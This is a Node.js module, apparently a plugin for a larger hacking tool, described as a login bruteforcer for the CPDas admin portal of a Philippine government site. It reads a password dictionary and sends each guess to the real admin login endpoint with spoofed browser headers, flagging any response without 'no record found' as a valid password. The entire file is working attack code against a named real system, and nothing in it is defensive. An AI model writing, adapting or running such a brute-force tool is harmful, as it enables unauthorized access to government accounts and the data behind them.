//Dependencies
const Request = require("request")

//Main
function info(){
    return {
        "name": "CPDas PRC Deped Gov login bruteforcer",
        "author": "I2rys"
    }
}

function bruteforce(Fs, Chalk, Readline){
    Readline.question(`${Chalk.blueBright("username: ")}`, username=>{
        Readline.question(`${Chalk.blueBright("dictionary: ")}`, dictionary=>{
            var dictionary_data = Fs.readFileSync(dictionary, "utf8")
            dictionary_data = dictionary_data.replace(/\r/g, "").split("\n")

            var dictionary_index = 0

        
            Check()
            function Check(){
                if(dictionary_index == dictionary_data.length){
                    console.log(`${info().name} is finished bruteforcing.`)
                    process.exit()
                }
            
                Request.post("https://cpdas.prc.gov.ph/admin/loginAdmin.aspx/logIn", {
                    headers: {
                        "Cookie": "SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1",
                        "Origin": "https://cpdas.prc.gov.ph",
                        "Referer": "https://cpdas.prc.gov.ph/admin/loginAdmin.aspx",
                        "Content-Type": "application/json",
                        "x-requested-with": "XMLHttpRequest",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
                    },
                    body: JSON.stringify({ "uname": username, "pword": dictionary_data[dictionary_index] })
                }, function(err, res, body){
                    if(body.indexOf("no record found") == -1){
                        console.log(`Valid password ${dictionary_data[dictionary_index]}`)
                    }else{
                        console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
                    }
            
                    dictionary_index += 1
                    Check()
                    return
                })
            }
        })
    })
}

//Exporter
module.exports = {
    info: info,
    bruteforce: bruteforce
}